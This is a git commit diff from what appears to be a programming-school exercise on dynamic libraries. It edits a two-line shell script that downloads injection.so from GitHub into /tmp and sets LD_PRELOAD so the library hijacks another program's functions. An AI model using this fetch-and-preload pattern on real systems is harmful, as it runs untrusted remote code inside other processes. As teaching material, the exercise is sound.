5b7e0960d54165ca8543cac3f0d953e11efef18a
itsferro <feras.mamon.alzaidi@gmail.com>
2023-12-11 18:58:10 -0800

    Task number 101 attempt number 3

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -p /tmp/ https://github.com/itsferro/alx-low_level_programming/blob/master/0x18-dynamic_libraries/injection.so
+wget -P /tmp/ https://github.com/itsferro/alx-low_level_programming/blob/master/0x18-dynamic_libraries/injection.so
 export LD_PRELOAD=/tmp/injection.so
